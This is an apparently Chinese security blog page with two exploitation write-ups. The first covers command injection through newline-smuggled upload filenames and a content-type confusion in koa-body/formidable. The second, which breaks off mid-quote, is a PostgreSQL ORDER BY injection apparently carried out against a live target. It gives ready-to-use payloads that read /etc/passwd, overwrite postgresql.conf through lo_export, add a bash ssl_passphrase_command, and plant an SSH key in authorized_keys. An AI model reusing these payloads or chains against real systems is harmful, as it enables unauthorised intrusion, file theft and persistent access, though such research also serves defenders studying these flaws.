<p>因为用不了”\“字符，暂时放弃psql command RCE这条路子，同时因为是低权限账户，也不能通过执行任意SQL语句实现RCE。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/01/05/16098363668258.jpg"><br>虽然过滤了&amp;|;等字符，但是实际child_process.exec 也是调用的/bin/sh -c, 众所周知sh -c 可以通过换行实现注入新命令, 同时checkname方法中没有过滤换行。<br>观察功能代码可知，需要在文件保存成功后，才会执行命令，所以上传的文件名需要合法。 在linux下，对文件名的限制不像windows那么严格，除了”/“之外，所有的字符都合法，所以换行符也可以设置为文件名。</p>
<p>综上所示，只要能上传一个带有换行的文件名就可以成功RCE。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/01/05/16098367792110.jpg"><br>不过经过测试，给上传的文件名中敲了个enter发现会返回500.<br>报错 <code>TypeError: Cannot read property &#39;file&#39; of undefined</code></p>
<p>KOA-BODY实际解析multipart时，也是用的formidable库，</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> S.HEADER_VALUE:</span><br><span class="line">  <span class="keyword">if</span> (c == CR) &#123;</span><br><span class="line">    dataCallback(<span class="string">&#x27;headerValue&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">    callback(<span class="string">&#x27;headerEnd&#x27;</span>);</span><br><span class="line">    state = S.HEADER_VALUE_ALMOST_DONE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>formidable库在读取headerValue时，读到\r后就结束，直接敲回车为\r\n。所以\nb”成为了新的一行，再次解析因为不合法导致报错，所以不能直敲回车。修改\r\n为\n后提交，依旧返回500.<br>报错 <code>  TypeError: Cannot read property &#39;name&#39; of undefined</code>，错误与之前的不相同了。<br>查看formiable解析filename的方法，</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">headerField = headerField.toLowerCase();</span><br><span class="line">part.headers[headerField] = headerValue;</span><br><span class="line"></span><br><span class="line"><span class="comment">// matches either a quoted-string or a token (RFC 2616 section 19.5.1)</span></span><br><span class="line"><span class="keyword">var</span> m = headerValue.match(<span class="regexp">/\bname=(&quot;([^&quot;]*)&quot;|([^\(\)&lt;&gt;@,;:\\&quot;\/\[\]\?=\&#123;\&#125;\s\t/]+))/i</span>);</span><br><span class="line"><span class="keyword">if</span> (headerField == <span class="string">&#x27;content-disposition&#x27;</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (m) &#123;</span><br><span class="line">    part.name = m[<span class="number">2</span>] || m[<span class="number">3</span>] || <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  part.filename = self._fileName(headerValue);</span><br></pre></td></tr></table></figure>
<p>调用_fileName方法获取filename</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">IncomingForm.prototype._fileName = <span class="function"><span class="keyword">function</span>(<span class="params">headerValue</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// matches either a quoted-string or a token (RFC 2616 section 19.5.1)</span></span><br><span class="line">  <span class="keyword">var</span> m = headerValue.match(<span class="regexp">/\bfilename=(&quot;(.*?)&quot;|([^\(\)&lt;&gt;@,;:\\&quot;\/\[\]\?=\&#123;\&#125;\s\t/]+))($|;\s)/i</span>);</span><br><span class="line">  <span class="keyword">if</span> (!m) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> match = m[<span class="number">2</span>] || m[<span class="number">3</span>] || <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> filename = match.substr(match.lastIndexOf(<span class="string">&#x27;\\&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">  filename = filename.replace(<span class="regexp">/%22/g</span>, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">  filename = filename.replace(<span class="regexp">/&amp;#([\d]&#123;4&#125;);/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">m, code</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode(code);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> filename;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在该方法中，通过正则来获取filename, 虽然正则中使用了”(.*?)”但是因为没有开启模式/s模式修正符导致.不能匹配\n，所以获取到的filename为null，最终导致了异常。<br>观察_fileName方法可以发现，在该方法中截取了”\“后的字符当作文件名，同时会将html实体给还原回来，所以通过在文件名中注入<code>&amp;#0010;</code>就可以注入换行。<br>可以注入换行后，就相当于可以执行任意命令了，只需要绕过checkname的过滤就行，绕过这个比较简单。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkname</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> re = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="regexp">/([&amp;;|$`&#x27;&quot;/\\])|([.]&#123;2&#125;)/</span>);</span><br><span class="line">    <span class="keyword">return</span> !re.test(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/01/05/16098430971940.jpg"></p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/01/05/16098431103154.jpg"></p>
<h2 id="0x02-解决"><a href="#0x02-解决" class="headerlink" title="0x02 解决\"></a>0x02 解决\</h2><p>在_fileName方法中，因为<code>var filename = match.substr(match.lastIndexOf(&#39;\\&#39;) + 1);</code>的存在，导致文件名中不能含有”\“,如果可以含有”\“那么还可以尝试使用psql command实现rce。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (opts.json &amp;&amp; ctx.is(jsonTypes)) &#123;</span><br><span class="line">  bodyPromise = buddy.json(ctx, &#123;</span><br><span class="line">    encoding: opts.encoding,</span><br><span class="line">    limit: opts.jsonLimit,</span><br><span class="line">    strict: opts.jsonStrict,</span><br><span class="line">    returnRawBody: opts.includeUnparsed</span><br><span class="line">  &#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (opts.urlencoded &amp;&amp; ctx.is(<span class="string">&#x27;urlencoded&#x27;</span>)) &#123;</span><br><span class="line">  bodyPromise = buddy.form(ctx, &#123;</span><br><span class="line">    encoding: opts.encoding,</span><br><span class="line">    limit: opts.formLimit,</span><br><span class="line">    queryString: opts.queryString,</span><br><span class="line">    returnRawBody: opts.includeUnparsed</span><br><span class="line">  &#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (opts.text &amp;&amp; ctx.is(<span class="string">&#x27;text/*&#x27;</span>)) &#123;</span><br><span class="line">  bodyPromise = buddy.text(ctx, &#123;</span><br><span class="line">    encoding: opts.encoding,</span><br><span class="line">    limit: opts.textLimit,</span><br><span class="line">    returnRawBody: opts.includeUnparsed</span><br><span class="line">  &#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (opts.multipart &amp;&amp; ctx.is(<span class="string">&#x27;multipart&#x27;</span>)) &#123;</span><br><span class="line">  bodyPromise = formy(ctx, opts.formidable);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>koa-body在处理request时，对于不同的请求类型使用了不同的方法来解析，当请求类型是multipart时，调用了formy来解析。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">normalize</span> (<span class="params">type</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> type !== <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// invalid type</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;urlencoded&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;multipart&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;multipart/*&#x27;</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>koa-body验证请求类型是否为multipart时，只验证了大类是否为multipart，不验证subtype, 所以multipart/xxxx 都会使用formy方法进行处理。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">formy</span>(<span class="params">ctx, opts</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> fields = &#123;&#125;;</span><br><span class="line">    <span class="keyword">var</span> files = &#123;&#125;;</span><br><span class="line">    <span class="keyword">var</span> form = <span class="keyword">new</span> forms.IncomingForm(opts);</span><br><span class="line">    ..............</span><br><span class="line">    form.parse(ctx.req);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在formy方法中，又调用了formidable库的parse方法解析request body。<br>formidable库中也会调用_parseContentType方法根据用户的content-type使用不同的方法解析body，</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">IncomingForm.prototype._parseContentType = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">this</span>.bytesExpected === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">this</span>._parser = dummyParser(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">this</span>.headers[<span class="string">&#x27;content-type&#x27;</span>]) &#123;</span><br><span class="line">    <span class="built_in">this</span>._error(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;bad content-type header, no content-type&#x27;</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">this</span>.headers[<span class="string">&#x27;content-type&#x27;</span>].match(<span class="regexp">/octet-stream/i</span>)) &#123;</span><br><span class="line">    <span class="built_in">this</span>._initOctetStream();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">this</span>.headers[<span class="string">&#x27;content-type&#x27;</span>].match(<span class="regexp">/urlencoded/i</span>)) &#123;</span><br><span class="line">    <span class="built_in">this</span>._initUrlencoded();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">this</span>.headers[<span class="string">&#x27;content-type&#x27;</span>].match(<span class="regexp">/multipart/i</span>)) &#123;</span><br><span class="line">    <span class="keyword">var</span> m = <span class="built_in">this</span>.headers[<span class="string">&#x27;content-type&#x27;</span>].match(<span class="regexp">/boundary=(?:&quot;([^&quot;]+)&quot;|([^;]+))/i</span>);</span><br><span class="line">    <span class="keyword">if</span> (m) &#123;</span><br><span class="line">      <span class="built_in">this</span>._initMultipart(m[<span class="number">1</span>] || m[<span class="number">2</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>._error(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;bad content-type header, no multipart boundary&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">this</span>.headers[<span class="string">&#x27;content-type&#x27;</span>].match(<span class="regexp">/json/i</span>)) &#123;</span><br><span class="line">    <span class="built_in">this</span>._initJSONencoded();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>但是formidable与koa-body的类型判断存在一定的差异性，formidable的判断比较简陋，只要内容存在multipart等就会使用对应的方法进行处理，koa-body本身未对octet-stream进行特殊处理，而formidable有对octet-stream处理。<br>当content-type设置为 multipart/octet-stream, 因为octet-stream分支在最前，所以不会使用multipart处理而是使用octet-stream进行处理。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">IncomingForm.prototype._initOctetStream = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.type = <span class="string">&#x27;octet-stream&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> filename = <span class="built_in">this</span>.headers[<span class="string">&#x27;x-file-name&#x27;</span>];</span><br><span class="line">  <span class="keyword">var</span> mime = <span class="built_in">this</span>.headers[<span class="string">&#x27;content-type&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> file = <span class="keyword">new</span> File(&#123;</span><br><span class="line">    path: <span class="built_in">this</span>._uploadPath(filename),</span><br><span class="line">    name: filename,</span><br><span class="line">    type: mime</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
<p>当请求类型为octet-stream时，文件名是从请求头中读取，并且未进行任何处理，所以这时候可以使用”\“字符。<br>这里假想一个环境，在真实环境的过滤中去除单引号以及”&quot;, 新增\n。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkname</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> re = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="regexp">/([&amp;;|$`&quot;/\n])|([.]&#123;2&#125;)/</span>);</span><br><span class="line">    <span class="keyword">return</span> !re.test(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过octet-stream方法，实现利用。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/01/05/16098450185482.jpg"><br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/01/05/16098450375285.jpg"></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2020/11/16/Postgresql-Superuser-SQL注入-RCE之旅/"><span>Postgresql Superuser SQL注入 RCE之旅</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2020/11/16/Postgresql-Superuser-SQL注入-RCE之旅/" rel="bookmark">
        <time class="entry-date published" datetime="2020-11-16T05:45:59.000Z">
          2020-11-16
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>在测试时，遇到了一个Node.js + Postgresql的ORDER BY注入。</p>
<p><code>sorter=cast((select+user)as+integer)</code><br>返回<br>invalid input syntax for integer: &quot;postgres&quot;<br>当前用户为postgres,</p>
<p><code>sorter=cast((select+version())as+integer)</code><br>返回<br>PostgreSQL 10.1 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 4.4.6 20110731 (Red Hat 4.4.6-4)</p>
<p>版本为PostgreSQL 10， 很明显能够发现当前用户是superuser，superuser感觉rce问题不大。<br>测试能否多语句，如果可以多语句就可以通过COPY直接实现RCE</p>
<p><code>sorter=1;select/**/1;--</code><br>返回<br>cannot insert multiple commands into a prepared statement，knex预编译不支持多行命令。pgsql不支持多行时,RCE就比较麻烦了。</p>
<p>先从读文件开始慢慢搞起，<br><code>sorter=cast((select+PG_READ_FILE(&#39;/etc/passwd&#39;))as+integer)</code><br>返回<br>syntax error at or near &quot;\&quot;，单引号被转义不能够直接使用，将单引号替换掉</p>
<p><code>sorter=cast((select/**/PG_READ_FILE($$/etc/passwd$$))as/**/integer)</code><br>返回<br>absolute path not allowed，在低版本pgsql中PG_READ_FILE、PG_LS_DIR等方法都不支持绝对路径，不过还是能够用largeobject读取文件。</p>
<p><code>sorter=(select/**/lo_import($$/etc/passwd$$,11111))</code><br>页面返回正常， 然后读取loid 11111的data字段获取文件内容<br><code>sorter=(select/**/cast(encode(data,$$base64$$)as/**/integer)/**/from/**/pg_largeobject/**/where/**/loid=11111)</code></p>
<p>将base64解开，<br>tcpdump:x:72:72::/:/sbin/nologin<br>syslog:x:996:994::/home/syslog:/bin/false<br>postgres:x:1000:1000::/home/postgres:/bin/bash</p>
<p>发现postgres账户竟然有/bin/bash能够登陆，那么如果目标机器开了ssh服务，只要往postgres的.ssh目录下写入自己的公钥就能够成功登陆了,扫描发现目标确实开了ssh服务。<br>这里使用lo_export方法尝试往.ssh目录写文件，</p>
<p><code>sorter=(select/**/lo_export(11111,$$/home/postgres/.ssh/authorized_keys$$)</code><br>返回<br>desc  nulls last limit $5 - could not create server file &quot;/home/postgres/.ssh/authorized_keys&quot;: No such file or directory”,”statusCode”:200}</p>
<p>看来是postgres用户目录下并没有.ssh目录，如果能够创建.ssh目录就起飞，翻了很久文档也没翻到能在单行语句下创建目录的方法，暂时只能放弃。</p>
<p>接着去翻了下superuser RCE的各类文章，发现基本都是copy、create的利用，没法在我遇到的环境下利用。<br>后面看到了一篇介绍修改postgres.conf配置文件实现RCE的利用，配置文件中的ssl_passphrase_command配置在需要获取用于解密SSL文件密码时会调用该配置的命令。<br>目标环境可以通过lo_export方法覆盖掉配置文件，添加上ssl_passphrase_command配置，重新加载配置后实现RCE。<br>按着参考文章的步骤一步一步来即可，首先本地测试</p>
<p>1、随便找个私钥文件，对私钥文件加密<br>openssl rsa -aes256 -in /usr/local/lib/node_modules/npm/node_modules/socks-proxy-agent/node_modules/agent-base/test/ssl-cert-snakeoil.key -out ./asd.key<br>2、通过注入读取config_file,首先查询配置文件地址select current_setting(‘config_file’)，然后通过lo_import读取原始配置文件内容。<br>3、上传pem，key到目标服务器上，pgsql限制私钥文件权限必须是0600才能够加载，这里搜索<br>pgsql目录下的所有0600权限的文件可以找到PG_VERSION文件,PG_VERSION与config_file文件同目录，上传私钥文件覆盖PG_VERSION，可绕过权限问题，pem文件可以上传到任意地址。<br>4、在原始配置文件内容末尾追加上ssl配置，再通过lo_export覆盖原始配置文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssl_cert_file &#x3D; &#39;&#x2F;tmp&#x2F;ssl-cert-snakeoil.pem&#39;</span><br><span class="line">ssl_key_file &#x3D; &#39;&#x2F;pgdata&#x2F;patroni&#x2F;data&#x2F;db&#x2F;PG_VERSION&#39;</span><br><span class="line">ssl_passphrase_command_supports_reload &#x3D; on</span><br><span class="line">ssl_passphrase_command &#x3D; &#39;bash -c &quot;touch &#x2F;tmp&#x2F;zzzzzzzzz &amp; echo passphrase; exit 0&quot;&#39;</span><br></pre></td></tr></table></figure>
<p>这里的echo passphrase，需要输出私钥密码，并且最后需要exit 0，如果私钥密码不对pg_reload_conf重新加载配置文件无影响，但是如果服务重启就无法启动了。<br>5、通过注入调用pg_reload_conf()函数，重新加载配置调用ssl_passphrase_command实现RCE.</p>
<p>本地测试成功，随后在目标上测试文件，文件写入成功但是最后pg_reload_conf()时，未实现RCE。<br>对比官方文档，发现pgsql 10版本根本没有ssl_passphrase_command配置，从11版本开始支持该配置。虽然这条路走不通了，不过这篇文章也提供了修改配置文件然后pg_reload_conf实现RCE的思路。postgres.conf中的一些配置是在reloadconf后就会触发，另外一些配置需要服务重启才会触发，接着翻文档看看能不能找到一些比较好玩的参数。<br>在日志章节中翻到了比较有意思的，</p>
<blockquote>
<p>logging_collector (boolean)<br>This parameter enables the logging collector, which is a background process that captures log messages sent to stderr and redirects them into log files. This approach is often more useful than logging to syslog, since some types of messages might not appear in syslog output. (One common example is dynamic-linker failure messages; another is error messages produced by scripts such as archive_command.) This parameter can only be set at server start.</p>
</blockquote>
<blockquote>
<p>log_directory (string)<br>When logging_collector is enabled, this parameter determines the directory in which log files will be created. It can be specified as an absolute path, or relative to the cluster data directory. This parameter can only be set in the postgresql.conf file or on the server command line. The default is log.</p>
</blockquote>
<p>logging_collector是用来配置是否开启日志的，只能在服务开启时配置，所以reloadconf不能修改它，但是log_directory配置并没有说只能在服务开启时配置，log_directory用来配置log日志文件存储到哪个目录，很容易想到如果log_directory配置到一个不存在的目录,pgsql会不会帮我创建目录。<br>经过本地测试，配置文件中的log_directory配置的目录不存在时，pgsql启动会失败，但是如果服务已启动修改配置后再reload_conf目录会被创建，通过该特性再结合刚才的ssh就可以实现利用了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">log_destination &#x3D; &#39;csvlog&#39;</span><br><span class="line">log_directory &#x3D; &#39;&#x2F;pgdata&#x2F;patroni&#x2F;logs&#x2F;postgresql&#39;</span><br><span class="line">log_filename &#x3D; &#39;postgresql-%Y-%m-%d_%H%M%S.log&#39;</span><br><span class="line">log_rotation_age &#x3D; &#39;1d&#39;</span><br><span class="line">log_rotation_size &#x3D; &#39;512MB&#39;</span><br><span class="line">log_timezone &#x3D; &#39;Asia&#x2F;Hong_Kong&#39;</span><br><span class="line">logging_collector &#x3D; &#39;on&#39;</span><br></pre></td></tr></table></figure>
<p>查看一下刚才读取的目标pgsql配置文件,发现已经开启了日志记录，那么只要修改掉log_directory配置即可实现目录创建。<br>将配置文件中的日志部分修改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">log_destination &#x3D; &#39;csvlog&#39;</span><br><span class="line">log_directory &#x3D; &#39;&#x2F;home&#x2F;postgres&#x2F;.ssh&#39;</span><br><span class="line">log_filename &#x3D; &#39;postgresql-%Y-%m-%d_%H%M%S.log&#39;</span><br><span class="line">log_rotation_age &#x3D; &#39;1d&#39;</span><br><span class="line">log_rotation_size &#x3D; &#39;512MB&#39;</span><br><span class="line">log_timezone &#x3D; &#39;Asia&#x2F;Hong_Kong&#39;</span><br><span class="line">logging_collector &#x3D; &#39;on&#39;</span><br></pre></td></tr></table></figure>
<p>再去覆盖原有配置文件，首先将修改后的配置文件加载到largeobject中<br><code>sorter=(select/**/lo_from_bytea(10000,decode($$配置文件内容base64$$,$$base64$$)))</code></p>
<p>再通过lo_export覆盖配置文件<br><code>sorter=(select/**/lo_export(10000,$$配置文件地址$$))</code></p>
<p>再重新加载配置文件<br><code>sorter=(select/**/pg_reload_conf())</code><br>这时候再随便请求一次，产生日志文件。</p>
<p><code>sorter=(select/**/lo_export(11111,$$/home/postgres/.ssh/authorized_keys$$)</code><br>再尝试将自己的公钥写入到authorized_keys，这次返回正常了。<br>不过ssh连接postgres账户，提示还是需要密码，怀疑可能是站库分离，公钥写入到的不是WEB服务器，通过注入获取数据库服务器ip。</p>
<p><code>sorter=cast((select/**/inet_server_addr()||$$$$)as/**/integer)</code><br>获取到了DB IP,再次连接DB服务器的ssh就ok了, 最后.ssh目录内容如下。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2020/11/16/16030131293651.jpg"></p>
<p>在搞定后，还是觉得这种方法很鸡肋，条件太多<br>1、postgres账户能登录服务器<br>2、DB服务器需要有外网ip<br>3、DB服务器开启了ssh服务<br>4、DB服务器已开启日志功能</p>
<p>于是尝试去寻找一些更通用的方法，翻了会文档又找到了几个比较有趣的</p>
<blockquote>
<p>local_preload_libraries (string)<br>This variable specifies one or more shared libraries that are to be preloaded at connection start. It contains a comma-separated list of library names, where each name is interpreted as for the LOAD command. Whitespace between entries is ignored; surround a library name with double quotes if you need to include whitespace or commas in the name. The parameter value only takes effect at the start of the connection. Subsequent changes have no effect. If a specified library is not found, the connection attempt will fail.</p>
</blockquote>
<blockquote>
<p>This option can be set by any user. Because of that, the libraries that can be loaded are restricted to those appearing in the plugins subdirectory of the installation’s standard library directory. (It is the database administrator’s responsibility to ensure that only “safe” libraries are installed there.) Entries in local_preload_libraries can specify this directory explicitly, for example $libdir/plugins/mylib, or just specify the library name — mylib would have the same effect as $libdir/plugins/mylib.</p>
</blockquote>
<blockquote>
<p>The intent of this feature is to allow unprivileged users to load debugging or performance-measurement libraries into specific sessions without requiring an explicit LOAD command. To that end, it would be typical to set this parameter using the PGOPTIONS environment variable on the client or by using ALTER ROLE SET.</p>
</blockquote>
<blockquote>
<p>However, unless a module is specifically designed to be used in this way by non-superusers, this is usually not the right setting to use. Look at session_preload_libraries instead.</p>
</blockquote>
<blockquote>
<p>session_preload_libraries (string)<br>This variable specifies one or more shared libraries that are to be preloaded at connection start. It contains a comma-separated list of library names, where each name is interpreted as for the LOAD command. Whitespace between entries is ignored; surround a library name with double quotes if you need to include whitespace or commas in the name. The parameter value only takes effect at the start of the connection. Subsequent changes have no effect. If a specified library is not found, the connection attempt will fail. Only superusers can change this setting.</p>
</blockquote>
<blockquote>
<p>The intent of this feature is to allow debugging or performance-measurement libraries to be loaded into specific sessions without an explicit LOAD command being given. For example, auto_explain could be enabled for all sessions under a given user name by setting this parameter with ALTER ROLE SET. Also, this parameter can be changed without restarting the server (but changes only take effect when a new session is started), so it is easier to add new modules this way, even if they should apply to all sessions.</p>
</blockquote>
<blockquote>
<p>Unlike shared_preload_libraries, there is no large performance advantage to loading a library at session start rather than when it is first used. There is some advantage, however, when connection pooling is used.</p>
</blockquote>
<blockquote>
<p>shared_preload_libraries (string)<br>This variable specifies one or more shared libraries to be preloaded at server start. It contains a comma-separated list of library names, where each name is interpreted as for the LOAD command. Whitespace between entries is ignored; surround a library name with double quotes if you need to include whitespace or commas in the name. This parameter can only be set at server start. If a specified library is not found, the server will fail to start.</p>
</blockquote>
<blockquote>
<p>Some libraries need to perform certain operations that can only take place at postmaster start, such as allocating shared memory, reserving light-weight locks, or starting background workers. Those libraries must be loaded at server start through this parameter. See the documentation of each library for details.</p>
</blockquote>
<blockquote>
